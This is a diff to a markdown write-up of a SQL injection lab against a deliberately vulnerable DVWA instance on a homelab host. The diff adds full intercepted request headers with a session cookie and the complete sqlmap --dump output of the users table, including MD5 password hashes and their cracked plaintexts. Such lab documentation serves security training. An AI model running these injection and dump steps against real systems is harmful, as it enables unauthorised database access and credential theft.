@@ -15,7 +15,14 @@ The login request was intercepted using Burp Suite:
 ```
 GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
 Host: dvwa-1.homelab.local
-Cookie: PHPSESSID=xxxx; security=low
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://dvwa-1.homelab.local/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=6ccba7a978f66dd1e679352c30638458; security=low
+Connection: keep-alive
 ```
 
 ### Key Observations
@@ -82,7 +89,7 @@ users
 
 ---
 
-## 💣 5. Exploitation (Data Extraction)
+## 5. Exploitation (Data Extraction)
 
 Command used:
 
@@ -92,13 +99,28 @@ sqlmap -r sqlmap-input.txt --dump -D dvwa -T users
 
 ### Extracted Data
 
-| User   | Password |
-|--------|----------|
-| admin  | password |
-| gordonb| abc123   |
-| 1337   | charley  |
-| pablo  | letmein  |
-| smithy | password |
+``` bash
+Database: dvwa
+Table: users
+[5 entries]
++---------+--------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+
+| user_id | role   | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login | account_enabled |
++---------+--------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+
+| 1       | admin  | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2026-04-13 10:43:09 | 0            | 1               |
+| 2       | user   | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2026-04-13 10:43:09 | 0            | 1               |
+| 3       | user   | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2026-04-13 10:43:09 | 0            | 1               |
+| 4       | user   | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2026-04-13 10:43:09 | 0            | 1               |
+| 5       | user   | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2026-04-13 10:43:09 | 0            | 1               |
++---------+--------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+
+```
+
+| User    | Password |
+| ------- | -------- |
+| admin   | password |
+| gordonb | abc123   |
+| 1337    | charley  |
+| pablo   | letmein  |
+| smithy  | password |
 
 ### Notes
 
